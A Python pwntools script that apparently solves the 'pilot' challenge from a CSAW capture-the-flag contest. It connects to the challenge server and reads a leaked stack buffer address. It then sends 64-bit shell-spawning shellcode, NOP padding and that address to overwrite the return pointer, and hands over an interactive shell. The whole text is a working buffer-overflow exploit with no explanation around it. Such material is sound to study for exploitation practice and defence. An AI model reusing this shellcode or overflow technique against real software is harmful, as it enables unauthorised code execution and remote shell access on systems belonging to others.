from pwn import *
shellcode_27byte ="\x48\x83\xc4\x10\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#p = process('./pilot')
p = remote("pwn.chal.csaw.io",8464)
#gdb.attach(proc.pidof(p)[0])
p.recvuntil('0x')
addr = p.recvn(12)

print "BUF address: " + hex(int(addr ,16))


payload = shellcode_27byte
payload += "\x90" * 9
payload += p64(int(addr, 16))

print p.recv(timeout=0.1)
p.sendline(payload)
p.interactive()
